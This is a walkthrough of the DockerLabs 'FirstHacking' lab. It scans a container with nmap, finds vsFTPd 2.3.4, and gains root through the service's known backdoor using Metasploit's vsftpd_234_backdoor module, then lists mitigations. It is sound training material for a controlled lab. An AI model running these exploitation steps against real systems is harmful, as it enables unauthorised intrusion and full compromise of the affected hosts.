# 🐳 DockerLabs - FirstHacking 
  
## 📌 General Information  
  
- **Target IP:** 172.17.0.2   
- **Environment:** Docker Lab (Controlled)   
- **Difficulty:** Very Easy   
  
---  
  
## 🎯 Objective  
  
Identify exposed services, detect vulnerabilities, and gain access to the target system.  
  
---  
  
## 🔍 Recognition  
  
### Full Port Scan  
```bash
nmap -p- -T4 172.17.0.2
```
#### Result:
<img width="539" height="190" alt="image" src="https://github.com/user-attachments/assets/61400e72-89b7-48bc-bc0d-ed23b691543e" />

----------

## 🧠 Analysis

Only one port was exposed:

-   **Port 21 (FTP)**

This reduces the attack surface and indicates the need to focus on the FTP service.

----------

## 🔎 Enumeration

### Service Detection
```bash
nmap -sC  -sV  -p  21  172.17.0.2
```
#### Result:
<img width="779" height="221" alt="image" src="https://github.com/user-attachments/assets/51d7ba0d-3353-4e28-930d-3a74930389bd" />

----------

## 🚨 Vulnerability Identification

The service **vsFTPd 2.3.4** is known to contain a **backdoor vulnerability**.

-   **Type:** Backdoor
-   **Impact:** Remote Code Execution (RCE)
-   **Authentication:** Not required

----------

## 💣 Exploitation

### Using Metasploit

```bash
msfconsole  
search vsftpd 2.3.4  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 172.17.0.2  
run
```
#### Result:
<img width="978" height="151" alt="image" src="https://github.com/user-attachments/assets/4dc90e3b-1df3-4f97-afe0-685dd0cb333a" />
<img width="837" height="189" alt="image" src="https://github.com/user-attachments/assets/b9c19f82-9f3f-4040-997a-75525cf1fbb6" />

----------

## 🧬 Post-Exploitation
Bash:
```bash
whoami
```
```bash
id 
```
```bash
hostname  
```
### Result: 
<img width="338" height="130" alt="image" src="https://github.com/user-attachments/assets/887a7b32-b7be-4ce1-a816-0d0f0fc81009" />

----------

## 🎯 Impact

-   Full system compromise
-   Root-level access obtained
-   No authentication required

----------

## 🛡️ Mitigation

-   Upgrade vsFTPd to a secure version
-   Disable FTP if not required
-   Implement firewall restrictions
-   Monitor unusual activity

----------

## 📈 Conclusion

The target machine was successfully compromised by:

1.  Identifying an exposed FTP service
2.  Detecting a vulnerable version
3.  Exploiting a known backdoor
4.  Gaining root access
